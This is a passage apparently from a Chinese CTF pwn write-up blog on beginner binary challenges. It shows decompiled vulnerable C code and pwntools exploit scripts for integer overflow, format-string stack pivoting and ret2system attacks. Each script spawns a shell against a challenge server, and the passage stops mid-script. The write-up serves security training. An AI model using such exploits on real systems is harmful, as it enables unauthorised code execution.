<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">28465</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&quot;pop rdi&quot;</span>,<span class="string">&quot;ret&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">ret = rop.find_gadget([<span class="string">&quot;ret&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">leave = rop.find_gadget([<span class="string">&quot;leave&quot;</span>,<span class="string">&quot;ret&quot;</span>])[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(leave)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">offset = <span class="number">0x50</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r()</span><br><span class="line">sl(<span class="string">&quot;%16$p&quot;</span>)</span><br><span class="line">rl(<span class="string">&quot;hello,&quot;</span>)</span><br><span class="line">fake_rbp = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>) - <span class="number">0x60</span></span><br><span class="line">success(<span class="string">&quot;fake_rbp: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(fake_rbp))</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&quot;/bin/sh\x00&quot;</span>,ret,rdi,fake_rbp,system])</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_rbp) + p64(leave)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="SWPUCTF-2022-新生赛-Integer-Overflow"><a href="#SWPUCTF-2022-新生赛-Integer-Overflow" class="headerlink" title="[SWPUCTF 2022 新生赛]Integer Overflow"></a>[SWPUCTF 2022 新生赛]Integer Overflow</h3><p>检查安全机制</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n1ght@DESKTOP-ISKQ7KA [13:50:34] [~/pwn/nss/SWPUCTF_2022_新生赛_Integer_Overflow] </span><br><span class="line">-&gt; % checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/n1ght/pwn/nss/SWPUCTF_2022_\xe6\x96\xb0\xe7\x94\x9f\xe8\xb5\x9b_Integer_Overflow/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.yes&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.no&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me your choice:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">      choice2();</span><br><span class="line">    elsechoice();</span><br><span class="line">  &#125;</span><br><span class="line">  choice1();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">choice1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">20</span>]; <span class="comment">// [esp+8h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes[<span class="number">2</span>]; <span class="comment">// [esp+1Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[36m Good luck!!!\n\x1B[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[5m Tell me your name now!\n\x1B[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes[<span class="number">0</span>] &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31m Are u kidding??\n\x1B[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[36m What&#x27;s u name?\n\x1B[0m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, nbytes[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现输入无符号整数，比较适合是int有符号整数，所以存在整数溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">26538</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">offset = <span class="number">0x20</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(offset)],elf.sym[<span class="string">&#x27;system&#x27;</span>],<span class="number">0xdeaf</span>,<span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="HNCTF-2022-Week1-ezcmp"><a href="#HNCTF-2022-Week1-ezcmp" class="headerlink" title="[HNCTF 2022 Week1]ezcmp"></a>[HNCTF 2022 Week1]ezcmp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">44</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GDB-pwndbg maybe useful&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(src, <span class="string">&quot;Ayaka_nbbbbbbbbbbbbbbbbb_pluss&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(buff, src);</span><br><span class="line">  seed = <span class="number">1</span>;</span><br><span class="line">  srand(<span class="number">1u</span>);</span><br><span class="line">  enccrypt(buff);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buff, buf, <span class="number">0x1E</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oh No!You lose!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from <span class="keyword">struct</span> import pack</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from pwn import *</span><br><span class="line">def <span class="title function_">s</span><span class="params">(a)</span> : p.<span class="title function_">send</span><span class="params">(a)</span></span><br><span class="line">def <span class="title function_">sa</span><span class="params">(a, b)</span> : p.<span class="title function_">sendafter</span><span class="params">(a, b)</span></span><br><span class="line">def <span class="title function_">sl</span><span class="params">(a)</span> : p.<span class="title function_">sendline</span><span class="params">(a)</span></span><br><span class="line">def <span class="title function_">sla</span><span class="params">(a, b)</span> : p.<span class="title function_">sendlineafter</span><span class="params">(a, b)</span></span><br><span class="line">def <span class="title function_">r</span><span class="params">()</span> : <span class="keyword">return</span> p.<span class="title function_">recv</span><span class="params">()</span></span><br><span class="line">def <span class="title function_">pr</span><span class="params">()</span> : <span class="title function_">print</span><span class="params">(p.recv())</span></span><br><span class="line">def <span class="title function_">rl</span><span class="params">(a)</span> : <span class="keyword">return</span> p.<span class="title function_">recvuntil</span><span class="params">(a)</span></span><br><span class="line">def <span class="title function_">inter</span><span class="params">()</span> : p.<span class="title function_">interactive</span><span class="params">()</span></span><br><span class="line">def <span class="title function_">debug</span><span class="params">()</span>:</span><br><span class="line">    gdb.<span class="title function_">attach</span><span class="params">(p)</span></span><br><span class="line">    <span class="title function_">pause</span><span class="params">()</span></span><br><span class="line">def <span class="title function_">get_addr</span><span class="params">()</span> : <span class="keyword">return</span> <span class="title function_">u64</span><span class="params">(p.recvuntil(b<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="string">&#x27;\x00&#x27;</span>))</span></span><br><span class="line"><span class="meta"># def get_sb() : return libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + next(libc.search(b<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span></span><br><span class="line">def <span class="title function_">csu</span><span class="params">(rdi, rsi, rdx, rip, gadget)</span> : <span class="keyword">return</span> <span class="title function_">p64</span><span class="params">(gadget)</span> + <span class="title function_">p64</span><span class="params">(<span class="number">0</span>)</span> + <span class="title function_">p64</span><span class="params">(<span class="number">1</span>)</span> + <span class="title function_">p64</span><span class="params">(rip)</span> + <span class="title function_">p64</span><span class="params">(rdi)</span> + <span class="title function_">p64</span><span class="params">(rsi)</span> + <span class="title function_">p64</span><span class="params">(rdx)</span> + <span class="title function_">p64</span><span class="params">(gadget - <span class="number">0x1a</span>)</span></span><br><span class="line">def <span class="title function_">get_32_addr</span><span class="params">()</span>:	<span class="keyword">return</span> <span class="title function_">u32</span><span class="params">(p.recvuntil(b<span class="string">&#x27;\xf7&#x27;</span>)[<span class="number">-4</span>:].ljust(<span class="number">4</span>, b<span class="string">&#x27;\x00&#x27;</span>))</span></span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line"><span class="keyword">if</span> args[&#x27;DEBUG&#x27;]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">	port = <span class="number">1111</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.format(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="meta">#libc = ELF(<span class="string">&#x27;./libc-2.23-x64.so&#x27;</span>)</span></span><br><span class="line"><span class="meta"># gdb.attach(p,<span class="string">&quot;b *0x00000000040147A&quot;</span>)</span></span><br><span class="line">sl(flat([p64(<span class="number">0x144678aadc0e4072</span>),p64(<span class="number">0x84b6e81a4c7eb0e2</span>),p64(<span class="number">0xf426588abcee2052</span>),p64(<span class="number">0x0000c8cb2c5e90c2</span>)]))</span><br><span class="line"><span class="meta"># pause()</span></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="HUBUCTF-2022-新生赛-fmt"><a href="#HUBUCTF-2022-新生赛-fmt" class="headerlink" title="[HUBUCTF 2022 新生赛]fmt"></a>[HUBUCTF 2022 新生赛]fmt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">    fgets(s, <span class="number">50</span>, stream);</span><br><span class="line">  HIBYTE(v11) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Echo as a service&quot;</span>);</span><br><span class="line">    gets(format);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span 